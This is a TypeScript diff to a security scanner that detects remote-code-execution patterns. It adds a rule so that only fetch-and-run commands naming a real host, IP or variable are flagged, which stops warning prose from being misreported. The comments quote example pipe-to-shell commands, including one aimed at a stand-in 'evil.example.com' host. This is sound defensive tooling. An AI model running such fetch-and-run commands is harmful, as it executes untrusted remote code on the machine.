@@ -473,6 +473,28 @@ function isPlainDownload(text: string, index: number): boolean {
 }
 
 /**
+ * A fetch-and-run command names what it fetches: a real host
+ * (`https://get.example-tool.dev/install.sh`), an IP, or a shell variable
+ * holding the URL (`curl -s $PAYLOAD_URL | sh`). Prose that *warns against*
+ * the pattern with a placeholder (`curl ... | sh`) names nothing. Found in
+ * wonderwhy-er/DesktopCommanderMCP's terminal skill: "Be careful with
+ * (`curl ... | sh`), that's untrusted code execution; show it and confirm
+ * first" was reported as the skill executing remote code.
+ */
+const FETCH_TARGET = /https?:\/\/[a-z0-9][\w-]*(?:\.[\w-]+)+|\b\d{1,3}(?:\.\d{1,3}){3}\b|\$\{?[A-Za-z_]\w*\}?/i;
+// `curl evil.example.com | sh`: a scheme-less host. File names are not hosts.
+const BARE_HOST = /\b[a-z0-9][\w-]*(?:\.[a-z0-9][\w-]*)*\.([a-z]{2,})\b/gi;
+const FILE_EXTENSIONS = new Set(["sh", "md", "txt", "py", "js", "ts", "json", "yaml", "yml", "toml", "ps1", "bat", "exe", "zip", "gz", "tgz"]);
+
+function fetchesSomething(text: string, index: number, length: number): boolean {
+  const lineStart = text.lastIndexOf("\n", index - 1) + 1;
+  const lineEnd = text.indexOf("\n", index + length);
+  const span = text.slice(lineStart, lineEnd === -1 ? undefined : lineEnd);
+  if (FETCH_TARGET.test(span)) return true;
+  return [...span.matchAll(BARE_HOST)].some((m) => !FILE_EXTENSIONS.has(m[1].toLowerCase()));
+}
+
+/**
  * Detect capabilities in a file's text, retrying across deobfuscated variants
  * so homoglyph/zero-width/splice-cloaked commands are still found.
  *
@@ -514,8 +536,11 @@ export function detectCapabilities(text: string): CapabilityHit[] {
     }
 
     for (const re of REMOTE_EXEC_PATTERNS) {
-      const m = re.exec(variant.text);
-      if (m) add("remote-code-exec", m[0], m.index);
+      for (const m of variant.text.matchAll(new RegExp(re.source, `${re.flags.replace("g", "")}g`))) {
+        if (!fetchesSomething(variant.text, m.index, m[0].length)) continue;
+        add("remote-code-exec", m[0], m.index);
+        break;
+      }
     }
 
     for (const hit of detectFetchThenExec(variant.text)) {
